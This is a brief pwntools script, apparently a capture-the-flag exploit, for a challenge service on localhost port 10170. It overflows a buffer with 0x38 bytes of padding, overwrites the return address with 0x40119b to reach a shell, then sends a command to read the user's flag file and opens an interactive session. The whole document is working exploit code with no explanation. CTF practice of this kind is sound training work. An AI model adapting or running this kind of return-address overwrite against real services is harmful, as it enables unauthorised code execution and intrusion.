from pwn import *

r = remote("localhost" ,10170)

payload  =b'A'*0x38+p64( 0x40119b )

r.recvline()
r.sendline(payload)

r.sendline( b'cat /home/`whoami`/flag' )

r.interactive()